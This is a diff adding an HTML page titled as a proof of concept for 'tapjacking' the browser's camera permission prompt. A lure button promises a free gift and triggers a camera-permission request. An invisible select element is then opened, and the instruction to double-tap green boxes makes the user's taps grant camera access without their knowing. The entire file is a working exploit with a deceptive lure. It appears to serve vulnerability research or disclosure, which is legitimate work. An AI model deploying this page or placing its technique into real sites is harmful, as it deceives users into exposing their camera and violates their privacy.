@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Tapjacking Permission POC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
+      text-align: center;
+      background-color: #7242E3;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    button {
+      font-size: 25px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      padding: 10px 20px;
+      margin-bottom: 40px;
+    }
+
+    select {
+      opacity: 0; /* Hidden select for triggering double-click */
+      position: absolute;
+    }
+  </style>
+  <script>
+    function requestCameraPermission() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function (stream) {
+          console.log('Camera permission granted.');
+        })
+        .catch(function (error) {
+          console.error('Error accessing the camera:', error);
+        });
+    }
+
+    function handleClick() {
+      requestCameraPermission();
+      setTimeout(function() {
+        document.getElementById("selectme").showPicker();
+      }, 250);
+    }
+
+    function handleDoubleClick() {
+      alert("🎉 Congratulations! You won a free gift! 🎉");
+    }
+  </script>
+</head>
+<body>
+
+  <button onclick="handleClick()">
+    🎉 Click to Open Your Lucky Ticket and Double-Tap [🟩] the Green Box to Win a Free Gift! 🎉
+  </button>
+
+  <div>
+    <select id="selectme" ondblclick="handleDoubleClick()">
+      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
+      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
+      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
+      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
+      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
+      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
+      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
+    </select>
+  </div>
+
+</body>
+</html>
